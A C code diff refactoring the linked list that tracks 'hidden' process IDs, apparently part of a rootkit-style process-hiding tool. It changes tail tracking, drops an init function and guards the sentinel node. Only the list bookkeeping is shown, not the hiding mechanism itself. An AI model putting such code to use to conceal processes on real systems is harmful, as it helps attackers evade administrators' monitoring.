@@ -7,18 +7,18 @@ pid_list_t hidden_pids = {
     .pid  = -1,
     .prev = NULL,
     .next = NULL,
-    .head = NULL,
-    .tail = NULL
 };
 
-// https://tldp.org/LDP/lki/lki-2.html
+pid_list_t_ptr hidden_pids_tail = &hidden_pids;
+
+
 void
 hide_pid(pid_t pid)
 {
     if (list_contains_pid(&hidden_pids, pid))
         return;
 
-    add_pid_to_list(hidden_pids.tail, pid);
+    add_pid_to_list(hidden_pids_tail, pid);
 }
 
 void
@@ -28,13 +28,16 @@ unhide_pid(pid_t pid)
     if (!(node = find_pid_in_list(&hidden_pids, pid)))
         return;
 
+    if (node == &hidden_pids)
+        return;
+
     remove_pid_from_list(node, pid);
 }
 
 void
 clear_hidden_pids(void)
 {
-    pid_list_t_ptr i = hidden_pids.tail;
+    pid_list_t_ptr i = hidden_pids_tail;
     while ((i = remove_pid_from_list(i, i->pid)));
 }
 
@@ -46,13 +49,6 @@ unhide_pids(void)
 }
 
 
-void
-init_pid_list(void)
-{
-    hidden_pids.head = &hidden_pids;
-    hidden_pids.tail = &hidden_pids;
-}
-
 bool
 list_contains_pid(pid_list_t_ptr list, pid_t pid)
 {
@@ -60,14 +56,10 @@ list_contains_pid(pid_list_t_ptr list, pid_t pid)
 }
 
 pid_list_t_ptr
-find_pid_in_list(pid_list_t_ptr list, pid_t pid)
+find_pid_in_list(pid_list_t_ptr head, pid_t pid)
 {
     pid_list_t_ptr i;
-    for (i = list; i; i = i->next)
-        if (i->pid == pid)
-            return i;
-
-    for (i = list->prev; i; i = i->prev)
+    for (i = head; i; i = i->next)
         if (i->pid == pid)
             return i;
 
@@ -85,7 +77,7 @@ add_pid_to_list(pid_list_t_ptr tail, pid_t pid)
         node->next = NULL;
         node->prev = tail;
         tail->next = node;
-        hidden_pids.tail = node;
+        hidden_pids_tail = node;
         return node;
     }
 
@@ -95,13 +87,13 @@ add_pid_to_list(pid_list_t_ptr tail, pid_t pid)
 pid_list_t_ptr
 remove_pid_from_list(pid_list_t_ptr list, pid_t pid)
 {
-    pid_list_t_ptr ret = NULL, i = find_pid_in_list(list, pid);
+    pid_list_t_ptr i = find_pid_in_list(list, pid), ret = NULL;
 
-    if (i) {
+    if (i && (i->pid != -1)) {
         if (i->next)
             i->next->prev = i->prev;
         else
-            hidden_pids.head = i->prev;
+            hidden_pids_tail = i->prev ? i->prev : &hidden_pids;
 
         if (i->prev) {
             i->prev->next = i->next;
